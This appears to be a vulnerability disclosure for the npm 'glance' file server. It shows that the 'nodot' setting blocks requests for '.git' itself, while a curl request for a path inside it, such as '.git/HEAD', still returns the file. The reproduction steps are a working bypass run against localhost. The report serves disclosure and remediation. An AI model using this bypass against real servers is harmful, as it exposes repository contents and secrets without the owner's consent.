# Vulnerability

## Vulnerability Description

The `glance` modules allows directory browsing and to serve static files through the browser.
The config option `nodot` can be used to prevent serving sensitive folders such as `.git` or `.DS_Store` 
refer: https://github.com/jarofghosts/glance#command-line-options
This rule can be bypassed using the technique below which can lead to sensitive information disclosure (An interesting example: https://smitka.me/).

## Steps To Reproduce:

- Install `glance`
```
$ npm install -g glance
```

- Inside a project directory, initialise `git`.
```
$ git init
```

- Add rule to ignore dotfiles in `.glance.json`
```json
{
  "nodot": true
}
```

- Start `glance` in current directory.
```
$ glance --verbose
glance serving /project/directory on port 8080
```

- Now, current directory will be served by serve with the exception of folder `.git` and file `.gitignore`.
- If we try to curl .`git` or `.gitignore` we get a Not Found error
```
$ curl --path-as-is 127.0.0.1:8080/.git
...
<title>File Not Found</title>
...
```

- Although if we try to fetch files/folders inside a forbidden [dot]folder there is no problem at all and most of it's content can be extracted successfully  (except dotfiles itself).
```
$ curl --path-as-is 127.0.0.1:8080/.git/HEAD      
ref: refs/heads/master
```

## Impact

The essentially bypasses the `nodot` feature and allows an attacker to read from a directory that the victim has not allowed access to.
